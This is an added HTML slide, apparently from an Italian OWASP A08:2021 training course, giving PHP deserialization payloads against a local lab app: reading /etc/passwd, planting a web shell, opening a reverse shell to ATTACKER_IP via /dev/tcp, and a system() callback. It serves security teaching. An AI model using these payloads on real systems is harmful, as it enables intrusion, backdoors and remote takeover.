@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>OWASP A08:2021 - Esercizio 3: Payload Avanzati</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="nav-buttons">
+        <div class="nav-btn" id="nav-menu"><svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></div>
+        <div class="nav-btn" id="nav-prev"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg></div>
+        <div class="nav-btn" id="nav-next"><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
+    </div>
+
+    <div class="container">
+        <h1 class="title">🎭 Esercizio 3: Payload Avanzati</h1>
+        <div class="subtitle">Da RCE base a compromissione totale</div>
+
+        <div class="grid-2-col">
+            <div class="card border-red">
+                <div class="card-title">📂 Leggere File Sensibili</div>
+                <div class="card-text">
+                    Estrai <span class="tech-term">/etc/passwd</span>:
+                    <div class="code-box">O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:40:"cat /etc/passwd > /var/www/html/passwd.txt";}</div>
+                    <br>
+                    Poi visita:
+                    <div class="code-box">http://localhost:8008/passwd.txt</div>
+                </div>
+            </div>
+
+            <div class="card border-purple">
+                <div class="card-title">🐚 Creare Web Shell</div>
+                <div class="card-text">
+                    Crea una backdoor PHP permanente:
+                    <div class="code-box">O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:60:"echo '&lt;?php system($_GET[\"c\"]); ?&gt;' > /var/www/html/shell.php";}</div>
+                    <br>
+                    Poi esegui comandi:
+                    <div class="code-box">http://localhost:8008/shell.php?c=id</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="grid-2-col" style="margin-top: 25px;">
+            <div class="card border-blue">
+                <div class="card-title">🔌 Reverse Shell</div>
+                <div class="card-text">
+                    Apri un listener sulla tua macchina:
+                    <div class="code-box">nc -lvp 4444</div>
+                    <br>
+                    Payload (sostituisci ATTACKER_IP):
+                    <div class="code-box">O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:50:"bash -c 'bash -i >&amp; /dev/tcp/ATTACKER_IP/4444 0>&amp;1'";}</div>
+                </div>
+            </div>
+
+            <div class="card border-green">
+                <div class="card-title">🔧 Classe Alternativa</div>
+                <div class="card-text">
+                    <span class="tech-term">PluginConfig</span> con callback:
+                    <div class="code-box">O:12:"PluginConfig":2:{s:8:"settings";a:0:{};s:8:"callback";s:6:"system";}</div>
+                    <br>
+                    Usa <span class="tech-term">__wakeup()</span> per eseguire callback arbitrari.
+                </div>
+            </div>
+        </div>
+
+        <div class="card border-yellow" style="margin-top: 20px;">
+            <div class="card-title">⚠️ Attenzione ai Caratteri</div>
+            <div class="card-text">
+                Conta <strong>sempre</strong> i caratteri del comando! <span class="tech-term">s:40</span> significa 
+                esattamente 40 caratteri. Usa <span class="tech-term">echo -n "comando" | wc -c</span> per contare.
+            </div>
+        </div>
+    </div>
+
+    <script>const slideNumero = 5;</script>
+    <script src="main.js"></script>
+</body>
+</html>
+
